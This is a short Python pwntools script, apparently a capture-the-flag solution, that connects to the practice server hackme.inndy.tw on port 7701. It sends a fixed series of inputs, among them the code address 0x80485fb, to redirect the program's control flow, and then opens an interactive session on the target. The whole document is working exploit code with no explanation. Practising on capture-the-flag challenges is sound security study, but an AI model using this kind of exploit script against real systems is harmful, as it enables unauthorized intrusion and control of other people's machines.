from pwn import *

con = remote('hackme.inndy.tw', 7701)
con.recv()
con.sendline('Hacker')
con.recv()
con.sendline('1')
con.recv()
con.sendline('14')
con.recv()
con.sendline(str(0x80485fb))
con.recv()
con.sendline('0')
con.interactive()
